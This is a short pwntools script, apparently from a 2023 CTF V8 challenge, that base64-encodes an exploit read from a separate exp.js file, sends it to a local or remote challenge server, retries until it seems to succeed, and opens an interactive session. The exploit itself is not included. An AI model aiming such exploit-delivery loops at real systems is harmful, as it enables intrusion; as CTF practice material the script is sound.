from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './run.py'
HOST = 'v8box.2023.ctfcompetition.com'
PORT = 1337

def start():
	if not args.R:
		return process(TARGET)
	else:
		return remote(HOST, PORT)

with open('./exp.js') as f:
	sploit = f.read()
enced = b64e(sploit.encode()).encode()
while True:
	r = start()

	r.sendlineafter(b'exploit? ', str(len(enced)).encode())
	r.sendlineafter(b'base64!\n', enced)
	r.recvuntil(b'call hax')
	ret = r.recvuntil(b'Bye!', timeout = 1.0)
	if b'Bye!' not in ret:
		break
	r.close()

context.log_level = 'debug'
r.interactive()
r.close()
